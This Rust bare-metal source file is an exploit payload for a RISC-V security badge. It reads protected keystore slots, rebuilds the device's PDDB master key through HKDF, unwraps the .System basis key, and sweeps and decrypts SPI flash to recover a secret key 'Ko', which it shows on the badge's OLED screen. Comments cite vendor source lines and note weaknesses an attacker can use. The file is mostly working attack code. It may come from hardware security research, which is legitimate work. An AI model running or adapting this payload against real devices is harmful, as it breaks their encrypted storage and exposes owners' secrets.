//! Payload 2: derive the PDDB master key on-chip, unwrap the .System basis key,
//! and find Ko by exhaustive search against the vendor's own published checksum.
//!
//! NOTHING SECRET IS HARDCODED HERE. The master key is rebuilt from your badge's
//! own keystore every run, so this works on any badge and leaks nobody's keys.
//!
//! Pages:
//!   1  flash id 1-lane (3) | status reg | flash id 4-lane (3) | flags
//!         flags bit 0  StaticCryptoData found at 0x40_3000  (baosec-lite)
//!               bit 1  found at 0x40_4000                   (4 MiB build)
//!               bit 6  AES-KWP AIV passed: master key CONFIRMED
//!   2  eight bytes of the UUID slot. YOUR liveness control.
//!   3  found | 0x5A marker | where it was found (4) | crc32 ends
//!   4..7  Ko
//!
//! Read only. Not one byte is written to the SPI flash.

#![no_std]
#![no_main]

extern crate alloc;

use core::panic::PanicInfo;

#[path = "../common.rs"]
mod common;
#[path = "../ko.rs"]
mod ko;
use common::{crc32, draw_page8, open_oled, spin, Bump};

#[global_allocator]
static ALLOC: Bump = Bump;

#[panic_handler]
fn panic(_i: &PanicInfo) -> ! {
    loop {
        core::hint::spin_loop()
    }
}

const SLOT_BASE: usize = 0x603E_0000;
const fn slot(n: usize) -> usize {
    SLOT_BASE + n * 32
}
const UUID_ADDR: usize = slot(1); // Open. Liveness control only, NOT proof of Fw0.
const CPID_ADDR: usize = slot(3); // Open. Second half of the HKDF salt.
const ROOT_ADDR: usize = slot(256); // ROOT_SEED, Fw0. First element of the IKM.
const PT_ADDR: usize = 0x6100_0000;
const SATP: u32 = (1 << 31) | (3 << 22) | ((PT_ADDR as u32) >> 12);

// services/keystore/src/platform/baosec/store.rs
//   salt = UUID(slot 1) || CP_ID(slot 3)                         :212, :217
//   ikm  = ROOT_SEED(slot 256)                                   :116
//        || nuisance slots 8..128, then 1920..2048, in order      :189
//        || chaff_xor = XOR of slots 128..256                     :206
//        = (1 + 120 + 128 + 1) * 32 = 8000 bytes  (asserted at :207)
const IKM_LEN: usize = 8000;

static mut SALT: [u8; 64] = [0; 64];
static mut IKM: [u8; IKM_LEN] = [0; IKM_LEN];
static mut IKM_USED: usize = 0;
static mut RES_U: [u8; 32] = [0; 32];
static mut FAULTED: u32 = 0;

core::arch::global_asm!(
    ".section .text.entry, \"ax\"",
    ".global _start",
    "_start:",
    "  la   sp, _stack_top",
    "  la   t0, __sbss",
    "  la   t1, __ebss",
    "1:  bgeu t0, t1, 2f",
    "  sw   zero, 0(t0)",
    "  addi t0, t0, 4",
    "  j    1b",
    "2:  j payload_main",
);

core::arch::global_asm!(
    ".section .text, \"ax\"",
    ".align 4",
    ".global trap_entry",
    "trap_entry:",
    "  csrr t2, mcause",
    "  li   t3, 8",
    "  beq  t2, t3, 1f",
    "  li   t3, 9",
    "  beq  t2, t3, 1f",
    "  la   t0, {faulted}",
    "  li   t1, 1",
    "  sw   t1, 0(t0)",
    "1:",
    "  li   t0, 0x1800",
    "  csrs mstatus, t0",
    "  la   sp, _stack_top",
    "  la   t0, render",
    "  csrw mepc, t0",
    "  mret",
    faulted = sym FAULTED,
);
unsafe extern "C" {
    fn trap_entry();
}

/// U-mode at ASID 3. Every input to the KEK below is an Fw0 slot, so all of this
/// has to happen here, not in machine mode.
#[unsafe(no_mangle)]
pub unsafe extern "C" fn u_phase() -> ! {
    unsafe {
        let rd = |src: usize, dst: *mut u8| {
            for i in 0..32 {
                core::ptr::write_volatile(dst.add(i), core::ptr::read_volatile((src + i) as *const u8));
            }
        };
        let salt = core::ptr::addr_of_mut!(SALT) as *mut u8;
        rd(UUID_ADDR, salt);
        rd(CPID_ADDR, salt.add(32));
        rd(UUID_ADDR, core::ptr::addr_of_mut!(RES_U) as *mut u8);

        let ikm = core::ptr::addr_of_mut!(IKM) as *mut u8;
        let mut n = 0usize;
        rd(ROOT_ADDR, ikm); // ROOT_SEED
        n += 32;
        for s in 8..128usize {
            rd(slot(s), ikm.add(n));
            n += 32;
        } // NUISANCE_KEYS_0
        for s in 1920..2048usize {
            rd(slot(s), ikm.add(n));
            n += 32;
        } // NUISANCE_KEYS_1

        // chaff_xor: every chaff slot folded in with XOR. store.rs shuffles the
        // order for side-channel reasons, but XOR is commutative, so the result is
        // deterministic and an attacker can just do them in order.
        let mut chaff = [0u8; 32];
        for s in 128..256usize {
            for i in 0..32 {
                chaff[i] ^= core::ptr::read_volatile((slot(s) + i) as *const u8);
            }
        }
        for i in 0..32 {
            core::ptr::write_volatile(ikm.add(n + i), chaff[i]);
        }
        n += 32;

        core::ptr::write_volatile(core::ptr::addr_of_mut!(IKM_USED), n); // must be 8000
        core::arch::asm!("ecall", options(noreturn));
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn payload_main() -> ! {
    unsafe {
        let pt = PT_ADDR as *mut u32;
        for i in 0..1024usize {
            core::ptr::write_volatile(pt.add(i), ((i as u32) << 20) | 0xDF);
        }
        core::arch::asm!(
            "csrw mtvec, {tv}",
            "csrw medeleg, zero",
            "csrw mideleg, zero",
            "csrw stvec, {tv}",
            "sfence.vma",
            "csrw satp, {satp}",
            "sfence.vma",
            "li   t0, 0x1800",
            "csrc mstatus, t0",
            "csrw mepc, {e}",
            "mret",
            tv   = in(reg) trap_entry as usize,
            satp = in(reg) SATP,
            e    = in(reg) u_phase as usize,
            out("t0") _,
        );
    }
    loop {
        core::hint::spin_loop()
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn render() -> ! {
    unsafe {
        core::arch::asm!("csrw satp, zero", "sfence.vma");
    }
    let iox = bao1x_hal::iox::Iox::new(utralib::utra::iox::HW_IOX_BASE as *mut u32);
    let udma = bao1x_hal::udma::GlobalConfig::new();
    let mut oled = open_oled(&iox, &udma);
    let u = unsafe { *core::ptr::addr_of!(RES_U) };

    // ---- rebuild the PDDB master key --------------------------------------
    // info = "sec" | "dev", plus "oem", plus "tampered"   (store.rs:220-231)
    let owc = bao1x_hal::acram::OneWayCounter::new();
    let dev = owc.get(bao1x_api::DEVELOPER_MODE).unwrap_or(0xFFFF_FFFF);
    let oem = owc.get(bao1x_api::OEM_MODE).unwrap_or(0xFFFF_FFFF);
    let tam = owc.get(bao1x_api::BOOT0_PUBKEY_FAIL).unwrap_or(0xFFFF_FFFF);
    let mut info = [0u8; 16];
    let mut ilen = 0usize;
    if dev != 0 {
        info[0..3].copy_from_slice(b"dev");
    } else {
        info[0..3].copy_from_slice(b"sec");
    }
    ilen += 3;
    if oem != 0 {
        info[ilen..ilen + 3].copy_from_slice(b"oem");
        ilen += 3;
    }
    if tam != 0 {
        info[ilen..ilen + 8].copy_from_slice(b"tampered");
        ilen += 8;
    }

    let mut master = [0u8; 32];
    unsafe {
        let salt: &[u8] = core::slice::from_raw_parts(core::ptr::addr_of!(SALT) as *const u8, 64);
        let ikm: &[u8] = core::slice::from_raw_parts(core::ptr::addr_of!(IKM) as *const u8, IKM_LEN);
        let hk = hkdf::Hkdf::<sha2::Sha256>::new(Some(salt), ikm);
        hk.expand(&info[..ilen], &mut master).ok();
    }

    // ---- SPI FLASH bring-up ------------------------------------------------
    // Deliberately NOT identify_flash_reset_qpi(). It ends in flash_ensure_qe()
    // (spim.rs:1029 -> :1446) whose write-in-progress wait is
    //     loop { if flash_rdsr() & 1 == 0 { break } }      spim.rs:1228-1235
    // On a bus reading 0xff, 0xff & 1 == 1 forever: dark screen, lost boot cycle.
    // That path can also issue a NON-VOLATILE status register write, and the
    // vendor's own comment at swap.rs:109 says that write breaks later reads.
    use bao1x_api::udma::PeriphId;
    use bao1x_hal::{board::setup_memory_pins, ifram::IframRange, udma::*};
    const PERCLK: u32 = 100_000_000;

    let channel = setup_memory_pins(&iox);
    udma.clock_on(PeriphId::from(channel));
    let mut fl = unsafe {
        Spim::new_with_ifram(
            channel,
            PERCLK / 2,
            PERCLK,
            SpimClkPol::LeadingEdgeRise,
            SpimClkPha::CaptureOnLeading,
            SpimCs::Cs0, // Cs0 is FLASH. Cs1 is PSRAM: wrong chip, wasted night.
            0,
            0,
            None,
            16,
            4096,
            Some(6), // 0xEB needs 6 dummy cycles (spim.rs:1260)
            None,    // = SpimMode::Standard
            IframRange::from_raw_parts(
                bao1x_hal::board::SPIM_FLASH_IFRAM_ADDR,
                bao1x_hal::board::SPIM_FLASH_IFRAM_ADDR,
                4096 * 2,
            ),
        )
    };
    // 1-lane RDID first: pure read, needs no QE bit, and it latches command_set,
    // which mem_qpi_mode(true) needs to choose opcode 0x35 vs 0x38.
    let id_spi = fl.mem_read_id_flash();
    let sr = fl.flash_read_status_register();
    fl.mem_qpi_mode(true); // THE ONE MISSING LINE. loader swap.rs:116.
    let id_qpi = fl.mem_read_id_flash();

    // ---- unwrap the .System basis key --------------------------------------
    let mut page = [0u8; 4096];
    let mut sysk = [0u8; 32];
    let mut flags = 0u8;
    for (bit, scd_at) in [(0u8, 0x0040_3000u32), (1u8, 0x0040_4000u32)] {
        fl.mem_read(scd_at, &mut page[..], false);
        if u32::from_le_bytes([page[0], page[1], page[2], page[3]]) == 2 {
            flags |= 1 << bit;
            let mut wrapped = [0u8; 40];
            wrapped.copy_from_slice(&page[0x2C..0x2C + 40]); // system_key, hw.rs:79-89
            if ko::kwp_unwrap(&master, &wrapped, &mut sysk) {
                flags |= 0x40; // 64-bit AIV passed: the master key is CORRECT
                break;
            }
        }
    }

    // ---- exhaustive decrypt-and-oracle sweep -------------------------------
    let mut k0 = [0u8; 32];
    let mut hit = 0xFFFF_FFFFu32;
    let mut off = 0x0040_0000u32; // PDDB_ORIGIN
    while off < 0x0080_0000 {
        fl.mem_read(off, &mut page[..], false);
        if let Some(w) = ko::find_k0(&page[..]) {
            k0.copy_from_slice(&page[w..w + 32]);
            hit = off + w as u32;
            break;
        }
        if flags & 0x40 != 0 {
            let mut nonce = [0u8; 12];
            nonce.copy_from_slice(&page[0..12]);
            let mut tag = [0u8; 16];
            tag.copy_from_slice(&page[4080..4096]);
            ko::gcm_siv_ctr(&sysk, &nonce, &tag, &mut page[12..4080]);
            if let Some(w) = ko::find_k0(&page[12..4080]) {
                k0.copy_from_slice(&page[12 + w..12 + w + 32]);
                hit = off | 0x8000_0000; // high bit: found after decryption
                break;
            }
        }
        off += 4096;
    }

    let kc = crc32(&k0);
    let p1 = [
        (id_spi >> 16) as u8, (id_spi >> 8) as u8, id_spi as u8, sr as u8,
        (id_qpi >> 16) as u8, (id_qpi >> 8) as u8, id_qpi as u8, flags,
    ];
    let p3 = [
        if hit == 0xFFFF_FFFF { 0 } else { 1 }, 0x5A,
        (hit >> 24) as u8, (hit >> 16) as u8, (hit >> 8) as u8, hit as u8,
        (kc >> 24) as u8, kc as u8,
    ];
    loop {
        draw_page8(oled.buffer_mut(), &p1, 1);
        oled.redraw().ok();
        spin(400_000_000);
        draw_page8(oled.buffer_mut(), &u[0..8], 2);
        oled.redraw().ok();
        spin(400_000_000);
        draw_page8(oled.buffer_mut(), &p3, 3);
        oled.redraw().ok();
        spin(400_000_000);
        for p in 0..4usize {
            draw_page8(oled.buffer_mut(), &k0[p * 8..p * 8 + 8], p + 4);
            oled.redraw().ok();
            spin(400_000_000);
        }
    }
}
